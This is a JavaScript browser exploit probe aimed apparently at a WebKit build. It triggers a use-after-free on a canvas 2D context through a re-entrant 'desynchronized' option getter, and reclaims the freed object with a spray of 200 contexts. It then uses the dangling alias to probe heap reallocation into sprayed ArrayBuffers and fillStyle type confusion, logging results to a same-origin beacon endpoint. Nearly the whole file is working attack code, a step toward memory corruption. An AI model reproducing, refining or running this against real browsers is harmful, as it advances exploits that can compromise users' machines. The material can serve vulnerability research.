// p495-style-type-confusion.js
//
// Probe: CanvasRenderingContext2D State save/restore semantics on the
// aliased UAF pair (dCtx1 == sprayX[idx1], same C++ CanvasRenderingContext2D).
//
// CONTEXT (V490/V491 lineage):
//   dCtx1 and sprayX[idx1] are the SAME C++ object. Mutations go through the
//   SPRAY side; observations go through the DANGLING side. Both sides see the
//   identical m_state / m_stateStack, so save/restore experiments are safe
//   (no UAF deref of freed memory) while the aliased pair is alive.
//
// CanvasStyle in WK-1200 is a std::variant<Invalid, Color, CanvasGradient*,
// CanvasPattern*, CurrentColor-like>: 1-byte discriminant + variant data.
// Restore() copies a State back wholesale, so a partial variant update
// (data copied, discriminant stale) would show up as a type confusion on the
// next style read through the dangling wrapper. This probe:
//
//   TEST 1  lineDash save/clear/restore  -> deep copy vs shared buffer?
//   TEST 2  lineDash realloc (1000 doubles = 8000B) + AB spray of the same
//           size class -> does the new Vector land inside a sprayed AB?
//   TEST 3  fillStyle variant round-trip through save/restore -> does the
//           restored variant read back as gradient with intact pointer?
//
// Beacon prefix: V495-
(function () {
    var BASE = location.protocol + '//' + location.host;
    var T0 = Date.now();
    var bQ = [];

    function Q(tag, body) { bQ.push([tag, body || '']); }
    function flushBeacons() {
        for (var i = 0; i < bQ.length; i++) {
            try {
                var x = new XMLHttpRequest();
                x.open('POST', BASE + '/beacon/V495-' + bQ[i][0], false);
                x.setRequestHeader('Content-Type', 'text/plain');
                x.send('[' + (Date.now() - T0) + 'ms] ' + bQ[i][1]);
            } catch (e) {}
        }
        bQ = [];
    }

    function B(tag, body) {
        try {
            var x = new XMLHttpRequest();
            x.open('POST', BASE + '/beacon/V495-' + tag, false);
            x.setRequestHeader('Content-Type', 'text/plain');
            x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
        } catch (e) {}
    }

    function hex8(v) {
        var s = (v >>> 0).toString(16);
        while (s.length < 8) s = '0' + s;
        return s;
    }

    B('BOOT', navigator.userAgent);

    // ------------------------------------------------------------------
    // PHASE 0: Aliased pair via desynchronized-getter trick
    // ------------------------------------------------------------------
    var dCtx1 = null;
    var tc1 = document.createElement('canvas');
    tc1.width = 10; tc1.height = 10;
    document.body.appendChild(tc1);

    var cc1 = 0, s1 = {};
    Object.defineProperty(s1, 'desynchronized', {
        get: function () { cc1++; if (cc1 === 1) dCtx1 = tc1.getContext('2d'); return false; }
    });
    var lCtx1 = tc1.getContext('2d', s1);

    if (!dCtx1) { B('ABORT', 'uaf-fail'); return; }

    // Same-type spray: 200 contexts, lineWidth tags them 500..699
    var sprayC = [], sprayX = [];
    for (var i = 0; i < 200; i++) {
        var c = document.createElement('canvas');
        c.width = 10; c.height = 10;
        sprayC.push(c);
        var ctx = c.getContext('2d');
        ctx.lineWidth = 500 + i;
        sprayX.push(ctx);
    }

    var lw1 = -1;
    try { lw1 = dCtx1.lineWidth; } catch (e) { B('ABORT', 'lw-read-throw:' + e.message); return; }
    if (typeof lw1 !== 'number' || lw1 < 500 || lw1 >= 700) {
        B('UAF1-MISS', 'lw=' + lw1);
        flushBeacons();
        return;
    }
    var idx1 = Math.round(lw1 - 500);
    B('UAF1-ALIAS', 'idx=' + idx1);

    var SPRAY = sprayX[idx1];   // mutation side (safe, live wrapper)
    var DANG = dCtx1;           // observation side (dangling JS wrapper)

    // ------------------------------------------------------------------
    // TEST 1: lineDash deep-copy vs shared-buffer through save/restore
    // ------------------------------------------------------------------
    // a) SPRAY: set dash A
    // b) DANG:  read  -> expect A
    // c) SPRAY: save()
    // d) SPRAY: clear dash
    // e) DANG:  read  -> expect []  (current state is cleared)
    // f) SPRAY: restore()
    // g) DANG:  read  -> values preserved?
    //    Values preserved  => State-in-stack holds its own dash data.
    //    Then: if restore MOVED the vector out of the stack slot, a second
    //    "virtual restore" is impossible - we test that with the double
    //    restore below. Note the difference between a JS-visible Vector copy
    //    (deep) and a std::move (shallow) shows up as: after restore the
    //    stack slot still answers a later restore with the same values
    //    (deep copy kept) or with empty (moved-out).
    Q('T1-START', '');
    try {
        var dashA = [1.5, 2.5, 3.5];
        SPRAY.setLineDash(dashA);
        var rA = DANG.getLineDash();
        Q('T1-READ-A', 'len=' + (rA ? rA.length : 'null') +
            ',v=' + (rA && rA.length ? rA.join('/') : '-'));

        SPRAY.save();

        SPRAY.setLineDash([]);
        var rC = DANG.getLineDash();
        Q('T1-READ-CLEARED', 'len=' + (rC ? rC.length : 'null'));

        SPRAY.restore();
        var rD = DANG.getLineDash();
        var preserved = rD && rD.length === 3 && rD[0] === 1.5 && rD[1] === 2.5 && rD[2] === 3.5;
        Q('T1-READ-RESTORED', 'len=' + (rD ? rD.length : 'null') +
            ',v=' + (rD && rD.length ? rD.join('/') : '-') +
            ',preserved=' + preserved);

        // Re-set dash to a different value and restore again WITHOUT a new
        // save: if the stack slot was moved-out on the first restore, this
        // second restore either no-ops (stack empty) or returns a stale
        // copy. With a deep copy the second restore returns dash A again.
        SPRAY.setLineDash([9.75]);
        SPRAY.restore();
        var rE = DANG.getLineDash();
        Q('T1-SECOND-RESTORE', 'len=' + (rE ? rE.length : 'null') +
            ',v=' + (rE && rE.length ? rE.join('/') : '-') +
            ',stillA=' + (rE && rE.length === 3 && rE[0] === 1.5));
    } catch (e1) {
        Q('T1-ERR', e1.message);
    }

    // ------------------------------------------------------------------
    // TEST 2: lineDash realloc + 8000-byte AB spray
    // ------------------------------------------------------------------
    // 1000 doubles = 8000 bytes. Sequence:
    //   a) SPRAY: dash = big1 (1000 marker doubles)
    //   b) DANG:  read -> 1000 values, verify
    //   c) SPRAY: dash = []  -> old 8000B buffer freed
    //   d) spray 40 ABs of exactly 8000 bytes (hold views)
    //   e) SPRAY: dash = big2 (1000 DIFFERENT marker doubles)
    //      -> Vector allocates 8000B; if it lands in a freed/sprayed slot,
    //         the AB views now contain big2 values (write-through detection)
    //   f) DANG: read -> verify big2 intact
    //   g) scan all ABs for big2 markers and for stale big1 residue
    Q('T2-START', '');
    var AB_SIZE = 8000;
    var N_DASH = 1000;
    var abs = [], views = [];
    try {
        var big1 = [], big2 = [];
        for (var j = 0; j < N_DASH; j++) {
            big1.push(1.0 + j * 0.0625);       // distinct, 8-byte-irreproducible pattern
            big2.push(3000.0 + j * 0.03125);   // disjoint from big1
        }

        SPRAY.setLineDash(big1);
        var rr1 = DANG.getLineDash();
        var ok1 = rr1 && rr1.length === N_DASH && rr1[0] === big1[0] && rr1[N_DASH - 1] === big1[N_DASH - 1];
        Q('T2-READ-BIG1', 'len=' + (rr1 ? rr1.length : 'null') + ',ok=' + ok1 +
            ',v0=' + (rr1 && rr1.length ? rr1[0] : '-') +
            ',vEnd=' + (rr1 && rr1.length ? rr1[rr1.length - 1] : '-'));

        SPRAY.setLineDash([]);   // free old 8000B heap buffer
        Q('T2-CLEARED', 'freed-big1-buffer');

        // Spray ABs of exactly the dash-buffer size to cover the slot
        for (var k = 0; k < 40; k++) {
            var ab = new ArrayBuffer(AB_SIZE);
            abs.push(ab);
            views.push(new Float64Array(ab));
        }
        // Baseline: record initial uint32 at a few probe offsets to detect
        // later writes owned by us vs pre-existing junk.
        var nzBase = 0;
        for (var k2 = 0; k2 < views.length; k2++) {
            for (var o2 = 0; o2 < AB_SIZE; o2 += 4) {
                if (views[k2][o2 >> 3] !== 0) { nzBase++; break; }
            }
        }
        Q('T2-AB-SPRAY', 'count=40,size=' + AB_SIZE + ',nonzeroABs=' + nzBase);

        // New dash -> new (or reclaimed) 8000B buffer
        SPRAY.setLineDash(big2);
        var rr2 = DANG.getLineDash();
        var ok2 = rr2 && rr2.length === N_DASH && rr2[0] === big2[0] && rr2[N_DASH - 1] === big2[N_DASH - 1];
        Q('T2-READ-BIG2', 'len=' + (rr2 ? rr2.length : 'null') + ',ok=' + ok2 +
            ',v0=' + (rr2 && rr2.length ? rr2[0] : '-') +
            ',vEnd=' + (rr2 && rr2.length ? rr2[rr2.length - 1] : '-'));

        // Scan the AB views for big2 doubles (write-through) and big1 (residue)
        var hitsBig2 = [], hitsBig1 = [];
        for (var a = 0; a < views.length && hitsBig2.length < 8; a++) {
            for (var p = 0; p < N_DASH; p += 1) {
                var d = views[a][p];
                if (d === big2[p]) {
                    hitsBig2.push('ab=' + a + ',off=' + (p * 8) + ',v=' + d);
                    break;
                }
                if (d === big1[p]) {
                    hitsBig1.push('ab=' + a + ',off=' + (p * 8) + ',v=' + d);
                    break;
                }
            }
        }
        Q('T2-BIG2-HITS', hitsBig2.length ? hitsBig2.join(';') : 'none');
        Q('T2-BIG1-RESIDUE', hitsBig1.length ? hitsBig1.join(';') : 'none');

        // If big2 values appear in MORE than one AB, or at wrong offsets, the
        // Vector was reallocated onto sprayed memory - report exact layout.
        if (hitsBig2.length > 1) {
            Q('T2-MULTI-HIT', 'realloc-landed-in-ab=' + (hitsBig2.length > 1));
        }
    } catch (e2) {
        Q('T2-ERR', e2.message);
    }

    // ------------------------------------------------------------------
    // TEST 3: fillStyle std::variant round-trip through save/restore
    // ------------------------------------------------------------------
    // variant = { type(1B), data(RevPtr<CanvasGradient> | Color rgba) }
    //   a) SPRAY: createLinearGradient -> fillStyle = gradient
    //      variant = { type=gradient, data=CanvasGradient* }
    //   b) SPRAY: save()   -> stack copy of variant
    //   c) SPRAY: fillStyle = '#ff0000' -> variant = { type=color, data=rgba }
    //   d) DANG:  read fillStyle -> expect '#ff0000' (current state)
    //   e) SPRAY: restore() -> variant restored wholesale (or partially!)
    //   f) DANG:  read fillStyle -> gradient?
    //      Object            => full variant restored (type + ptr intact)
    //      '#ff0000' + throw => discriminant says gradient, data is rgba
    //                           => PARTIAL restore => type confusion proven
    //      Any throw here is itself the signal; beacon BEFORE the read.
    // Beacon order is deliberate: the last read is the risky one.
    Q('T3-START', '');
    try {
        var grad = SPRAY.createLinearGradient(0, 0, 1, 1);
        SPRAY.fillStyle = grad;
        var f0 = DANG.fillStyle;
        Q('T3-FILLBASE', 'type=' + (typeof f0) + ',str=' + String(f0).slice(0, 80));

        SPRAY.save();

        SPRAY.fillStyle = '#ff0000';
        var f1 = DANG.fillStyle;
        Q('T3-FILLCOLOR', 'type=' + (typeof f1) + ',str=' + String(f1).slice(0, 80));

        SPRAY.restore();
        Q('T3-PRE-DANGEROUS-READ', 'variant-restored,reading-fillStyle-through-dangling');

        var f2 = null, f2err = null;
        try { f2 = DANG.fillStyle; } catch (e3) { f2err = e3.message; }
        if (f2err) {
            Q('T3-CONFUSED', 'throw=' + f2err + ' => partial-restore/type-confusion candidate');
        } else {
            var t2 = typeof f2;
            Q('T3-READ-RESTORED', 'type=' + t2 + ',str=' + String(f2).slice(0, 80) +
                ',isGradientObj=' + (t2 === 'object' && f2 !== null));
            // Safe coercion follow-up: assign it back through SPRAY (live ctx).
            // If the restored variant holds a valid gradient ptr, this succeeds.
            try {
                SPRAY.fillStyle = f2;
                Q('T3-REASSIGN-OK', 'restored-style-reassigned-through-spray');
            } catch (e4) {
                Q('T3-REASSIGN-FAIL', e4.message);
            }
        }
    } catch (e5) {
        Q('T3-ERR', e5.message);
    }

    // ------------------------------------------------------------------
    // TEST 4: hex dump helper for any corruption found in TEST 2
    // ------------------------------------------------------------------
    if (views.length && hitsBig2 && hitsBig2.length) {
        try {
            // Print first 16 doubles of the first hit AB as hex
            var dump = [];
            for (var h = 0; h < 16 && h < N_DASH; h++) {
                var dv = h * 8;
                var lo = 0, hi = 0;
                // read raw bits via Uint32 view aliasing the same AB
                var u32 = new Uint32Array(abs[idxHit(hitsBig2)]);
                lo = u32[dv >> 2]; hi = u32[(dv >> 2) + 1];
                dump.push(dv + ':' + hex8(hi) + hex8(lo));
            }
            Q('T4-DUMP', dump.join(','));
        } catch (e6) {
            Q('T4-ERR', e6.message);
        }
    }

    Q('DONE', 'probe-complete');
    flushBeacons();

    // helper: parse ab index out of the first hit string
    function idxHit(hitArr) {
        var m = hitArr[0].split('ab=')[1];
        var end = m.indexOf(',');
        return parseInt(end === -1 ? m : m.slice(0, end), 10);
    }
})();
